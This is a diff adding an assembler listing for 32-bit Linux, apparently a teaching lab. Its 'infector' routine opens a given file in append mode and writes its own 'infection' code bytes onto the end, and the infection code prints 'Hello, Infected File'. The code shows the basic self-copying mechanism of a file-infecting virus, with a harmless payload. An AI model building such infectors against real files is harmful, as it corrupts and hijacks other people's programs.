@@ -1,0 +1,96 @@
+     1                                  section .text
+     2                                  global _start
+     3                                  global system_call
+     4                                  global infector
+     5                                  global infection
+     6                                  global code_start
+     7                                  global code_end
+     8                                  
+     9                                  
+    10                                  section .data
+    11 00000000 48656C6C6F2C20496E-     msg db "Hello, Infected File",10,0
+    11 00000009 666563746564204669-
+    11 00000012 6C650A00           
+    12                                  
+    13                                  extern main
+    14                                  _start:
+    15 00000016 59                          pop    dword ecx    ; ecx = argc
+    16 00000017 89E6                        mov    esi,esp      ; esi = argv
+    17                                      ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
+    18 00000019 89C8                        mov     eax,ecx     ; put the number of arguments into eax
+    19 0000001B C1E002                      shl     eax,2       ; compute the size of argv in bytes
+    20 0000001E 01F0                        add     eax,esi     ; add the size to the address of argv 
+    21 00000020 83C004                      add     eax,4       ; skip NULL at the end of argv
+    22 00000023 50                          push    dword eax   ; char *envp[]
+    23 00000024 56                          push    dword esi   ; char* argv[]
+    24 00000025 51                          push    dword ecx   ; int argc
+    25                                  
+    26 00000026 E8(00000000)                call    main        ; int main( int argc, char *argv[], char *envp[] )
+    27                                  
+    28 0000002B 89C3                        mov     ebx,eax
+    29 0000002D B801000000                  mov     eax,1
+    30 00000032 CD80                        int     0x80
+    31 00000034 90                          nop
+    32                                          
+    33                                  system_call:
+    34 00000035 55                          push    ebp             ; Save caller state
+    35 00000036 89E5                        mov     ebp, esp
+    36 00000038 83EC04                      sub     esp, 4          ; Leave space for local var on stack
+    37 0000003B 60                          pushad                  ; Save some more caller state
+    38                                  
+    39 0000003C 8B4508                      mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
+    40 0000003F 8B5D0C                      mov     ebx, [ebp+12]   ; Next argument...
+    41 00000042 8B4D10                      mov     ecx, [ebp+16]   ; Next argument...
+    42 00000045 8B5514                      mov     edx, [ebp+20]   ; Next argument...
+    43 00000048 CD80                        int     0x80            ; Transfer control to operating system
+    44 0000004A 8945FC                      mov     [ebp-4], eax    ; Save returned value...
+    45 0000004D 61                          popad                   ; Restore caller state (registers)
+    46 0000004E 8B45FC                      mov     eax, [ebp-4]    ; place returned value where caller can see it
+    47 00000051 83C404                      add     esp, 4          ; Restore caller state
+    48 00000054 5D                          pop     ebp             ; Restore caller state
+    49 00000055 C3                          ret                     ; Back to caller
+    50                                  
+    51                                  code_start:
+    52                                  
+    53                                      infection:
+    54 00000056 55                              push ebp            ;backup ebp
+    55 00000057 89E5                            mov ebp, esp        ;open new action frame
+    56 00000059 60                              pushad              ;backup registers
+    57 0000005A 9C                              pushfd              ;backup registers
+    58 0000005B B804000000                      mov eax, 4          ;write
+    59 00000060 BB01000000                      mov ebx, 1          ;stdout
+    60 00000065 B9[00000000]                    mov ecx, msg        ;string to write
+    61 0000006A BA16000000                      mov edx, 22         ;len of the string 
+    62 0000006F CD80                            int 0x80            ;interrupt the kernel to execute writing
+    63 00000071 9D                              popfd               ;restore registers
+    64 00000072 61                              popad               ;restore registers
+    65 00000073 5D                              pop ebp             ;back to previous action frame
+    66 00000074 C3                              ret                 ;Back to caller
+    67                                  
+    68                                      infector:
+    69 00000075 55                              push ebp             ;backup ebp
+    70 00000076 89E5                            mov ebp, esp         ;open new action frame
+    71 00000078 83EC04                          sub esp,4            ;place for return value 
+    72 0000007B 60                              pushad               ;backup registers
+    73 0000007C 9C                              pushfd               ;backup registers
+    74 0000007D B805000000                      mov eax, 5           ;open
+    75 00000082 8B5D08                          mov ebx, [ebp+8]     ;first arg - file descriptor
+    76 00000085 B901040000                      mov ecx, 1025        ;append to the end of the file
+    77 0000008A BAFF010000                      mov edx, 511         ;0777
+    78 0000008F CD80                            int 0x80             ;interrupt the kernel to execute open
+    79 00000091 8945FC                          mov [ebp-4], eax     ;save the file descriptor which came back from open call
+    80 00000094 B804000000                      mov eax, 4           ;write
+    81 00000099 8B5DFC                          mov ebx, [ebp-4]     ;move file descriptor to ebx (file descriptor)
+    82 0000009C B962B00408                      mov ecx, 134525026   ;the address of infection as we found 
+    83 000000A1 BA63000000                      mov edx,  99         ;len of the infection code 
+    84 000000A6 CD80                            int 0x80             ;interrupt the kernel to execute write
+    85 000000A8 B806000000                      mov eax, 6           ;close
+    86 000000AD 8B5DFC                          mov ebx, [ebp-4]     ;file descriptor
+    87 000000B0 CD80                            int 0x80             ;interrupt the kernel to execute close
+    88 000000B2 9D                              popfd                ;restore registers
+    89 000000B3 61                              popad                ;restore registers
+    90 000000B4 83C404                          add esp, 4           ;fix esp position - because the return value space
+    91 000000B7 5D                              pop ebp              ;back to previous action frame
+    92 000000B8 C3                              ret                  ;Back to caller
+    93                                  
+    94                                  code_end :
